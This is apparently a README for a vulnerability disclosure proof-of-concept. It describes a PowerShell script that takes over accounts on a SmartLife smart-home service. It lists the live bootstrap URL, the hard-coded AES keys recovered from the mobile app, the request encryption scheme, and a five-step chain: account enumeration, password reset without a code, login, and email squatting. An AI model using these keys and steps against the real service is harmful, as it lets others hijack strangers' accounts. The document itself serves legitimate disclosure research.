# Direct Replay PoC

This folder contains the standalone reproduction script demonstrating the SmartLife account takeover lifecycle against proof accounts.

---

## Included Files

- **`account-takeover-poc.ps1`**: Standalone PowerShell 7 script demonstrating public bootstrap decryption, email verification oracle, password reset without verification code, post-reset login verification, and email account squatting.

---

## Cryptographic Parameters

The script uses the exact cryptographic material identified from the official mobile client:

- **Bootstrap URL**: `https://ossx-smart.ztehome.com.cn:5443/api/getUacSignInfo?clientid=271950143414`
- **Bootstrap Decryption Key (CVE-2026-86555)**: `'096760a7a99d99d12de9fecbfca568c0'` (AES-128-GCM)
- **Recovered Client Symmetric Key**: `'djrom(&)(&)MORJD'` (AES-128-GCM)
  - Encrypts `X-Auth-Value` dynamic token: `aes_gcm_encrypt("${appUacSec},${appUacId},${appUacItp},${currentTimeMillis}", key)`
  - Encrypts email parameter in `/account/verify.serv`: `{"key": aes_gcm_encrypt(email, key)}`
  - Encrypts credentials in `/auth/login.serv`: `loginName = aes_gcm(email)`, `passWord = aes_gcm(newPassword)`

---

## Running the PoC

Prerequisites: **PowerShell 7 (`pwsh`)**

```powershell
pwsh -ExecutionPolicy Bypass -File .\account-takeover-poc.ps1
```

To pause between steps:

```powershell
pwsh -ExecutionPolicy Bypass -File .\account-takeover-poc.ps1 -PauseBetweenSteps
```

---

## Lifecycle Steps Demonstrated

1. **Bootstrap Decrypt (CVE-2026-86555)**: Queries `/api/getUacSignInfo`, decrypts `result.data` using `096760a7a99d99d12de9fecbfca568c0`, and populates `appClientKey`, `appUacId`, `appUacTenant`, `appUacItp`, and `appUacSec`.
2. **Account Enumeration (CVE-2026-86554)**: Encrypts target email with `djrom(&)(&)MORJD` and queries `/account/verify.serv`. Distinguishes non-existent accounts (`0004`) from registered accounts (`0000`) and reveals the backend `accountId`.
3. **Password Reset without Code (CVE-2026-86553)**: Posts `accountId` and `newPassword` to `/account/password/reset.serv` without requiring an email reset code or old password.
4. **Login Verification**: Encrypts credentials with `djrom(&)(&)MORJD`, computes SHA-256 `verifyCode`, and authenticates via `/auth/login.serv`, obtaining a valid session token.
5. **Account Squatting (CVE-2026-86552)**: Registers an arbitrary email identity via `/account/person/signup.serv` without proving mailbox ownership, allowing immediate login and blocking legitimate registration.
